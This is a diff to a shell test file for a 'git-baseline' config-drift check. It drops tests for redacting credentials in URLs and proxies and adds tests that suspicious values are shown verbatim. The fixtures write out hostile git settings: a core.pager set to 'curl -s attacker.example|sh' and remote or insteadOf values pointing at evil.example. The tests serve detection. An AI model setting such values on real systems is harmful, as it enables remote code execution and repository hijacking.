@@ -3686,55 +3686,32 @@ crew_tty() {
   [[ "$output" == *"url.https://evil.example/.insteadof=https://github.com/ (main checkout, "* ]]
 }
 
-@test "git-baseline redacts URL userinfo in a drifted value (#678)" {
-  git commit -q --allow-empty -m init
-  git config remote.origin.url https://x.example/r.git
-  seed_git_baseline
-  git config remote.origin.url https://u:tok-secret@x.example/r.git
-  run run_crew git-baseline
-  [ "$status" -eq 1 ]
-  [[ "$output" != *tok-secret* ]]
-  [[ "$output" == *'https://REDACTED@x.example/r.git'* ]]
-}
-
-@test "git-baseline redacts schemeless proxy userinfo (#678)" {
-  git commit -q --allow-empty -m init
-  seed_git_baseline
-  git config http.proxy u:tok-secret@p.example:3128
-  run run_crew git-baseline
-  [ "$status" -eq 1 ]
-  [[ "$output" != *tok-secret* ]]
-  [[ "$output" == *p.example:3128* ]]
-}
-
-@test "git-baseline redacts schemeless remote proxy userinfo (#678)" {
-  git commit -q --allow-empty -m init
-  seed_git_baseline
-  git config remote.o.proxy u:tok-secret@p:1
-  run run_crew git-baseline
-  [ "$status" -eq 1 ]
-  [[ "$output" != *tok-secret* ]]
-  [[ "$output" == *remote.o.proxy=REDACTED@p:1* ]]
-}
-
-@test "git-baseline never masks an exec value: the payload before an @ stays visible (#678)" {
+@test "git-baseline shows an exec value verbatim: the payload before an @ stays visible (#678)" {
   git commit -q --allow-empty -m init
   seed_git_baseline
   git config core.pager 'curl -s attacker.example|sh;: a@less'
   run run_crew git-baseline
   [ "$status" -eq 1 ]
   [[ "$output" == *attacker.example* ]]
-  [[ "$output" != *REDACTED* ]]
 }
 
-@test "git-baseline never masks an exec value that looks like a URL (#678)" {
+@test "git-baseline shows an exec value verbatim that looks like a URL (#678)" {
   git commit -q --allow-empty -m init
   seed_git_baseline
   git config core.pager 'x://curl attacker.example|sh;:@less'
   run run_crew git-baseline
   [ "$status" -eq 1 ]
   [[ "$output" == *attacker.example* ]]
-  [[ "$output" != *REDACTED* ]]
+}
+
+@test "git-baseline shows a bracketed ssh userinfo host verbatim (#678)" {
+  git commit -q --allow-empty -m init
+  git config remote.origin.url https://github.com/o/r.git
+  seed_git_baseline
+  git config remote.origin.url 'ssh://[evil.example]:22@github.com/o/r.git'
+  run run_crew git-baseline
+  [ "$status" -eq 1 ]
+  [[ "$output" == *evil.example* ]]
 }
 
 @test "git-baseline shows an scp-style remote url raw, so its host stays visible (#678)" {
@@ -3745,15 +3722,6 @@ crew_tty() {
   run run_crew git-baseline
   [ "$status" -eq 1 ]
   [[ "$output" == *remote.origin.url=attacker.example:x@github.com:o/r.git* ]]
-}
-
-@test "git-baseline redacts key and value apart, so a value's @ cannot hide the key's host (#678)" {
-  git commit -q --allow-empty -m init
-  seed_git_baseline
-  git config url.http://evil.example.insteadOf u@x
-  run run_crew git-baseline
-  [ "$status" -eq 1 ]
-  [[ "$output" == *url.http://evil.example.insteadof=* ]]
 }
 
 @test "git-baseline notes a baseline that predates redirect-key coverage (#678)" {
